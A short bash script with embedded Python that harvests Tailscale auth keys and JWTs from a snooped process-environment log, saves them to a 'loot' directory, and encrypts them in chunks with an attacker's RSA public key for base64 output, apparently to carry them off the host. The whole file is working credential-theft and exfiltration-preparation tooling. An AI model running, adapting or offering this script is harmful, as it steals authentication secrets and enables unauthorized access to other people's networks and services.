#!/bin/bash
mkdir -p /root/loot
python3 - <<'PY'
import re
data=open("/root/snoop/ps-env.log",errors="replace").read()
ts=set(re.findall(r"tskey-auth-[A-Za-z0-9_-]{10,}",data))
jw=set(re.findall(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",data))
open("/root/loot/tskey.txt","w").write("\n".join(sorted(ts)))
for i,t in enumerate(sorted(jw)): open(f"/root/loot/jwt{i}.txt","w").write(t)
print("extracted tskeys:",len(ts),"jwts:",len(jw))
PY
for f in /root/loot/tskey.txt /root/loot/jwt0.txt /root/loot/jwt1.txt /root/loot/jwt2.txt; do
  [ -f "$f" ] || continue
  echo "== $(basename $f) enc =="
  split -b 150 "$f" /tmp/chk_
  for c in /tmp/chk_*; do
    cat "$c" | openssl pkeyutl -encrypt -pubin -inkey /tmp/rr_pub.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0
    echo
  done
  rm -f /tmp/chk_*
  echo "-- end $(basename $f) --"
done
echo "== t-done =="
